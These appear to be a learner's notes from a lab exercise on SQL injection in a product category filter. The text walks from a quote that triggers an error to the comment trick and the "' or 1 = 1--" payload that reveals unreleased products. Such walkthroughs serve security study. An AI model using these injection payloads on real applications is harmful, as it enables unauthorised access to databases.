# SQL injection - product category filter

## SQL in app

`SELECT * FROM products WHERE category = 'Gifts' and released = 1;`

## end goal: display all products released and unreleased

``` sql
SELECT * FROM products WHERE category= 'Pets' AND released = 1
SELECT * FROM products WHERE category= ''' AND released = 1

i got error, then sqli is possible

SELECT * FROM products WHERE category=''-- AND released = 1
work normal but also show unreleased products

SELECT * FROM products WHERE category= ''
SELECT * FROM products WHERE category= '' or 1 = 1--' AND released = 1
got it
```
